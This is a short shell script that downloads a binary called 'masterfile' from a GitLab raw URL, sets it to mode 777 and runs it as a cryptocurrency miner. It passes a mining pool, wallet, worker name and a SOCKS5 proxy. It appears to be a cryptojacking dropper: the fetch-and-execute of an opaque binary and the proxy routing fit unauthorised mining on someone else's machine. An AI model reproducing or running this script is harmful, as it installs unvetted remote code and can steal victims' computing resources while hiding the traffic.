#!/bin/sh
wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
chmod 777 masterfile
POOL=dcy.pool-pay.com:5657
WALLET=endvoc
WORKER=endvoc
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
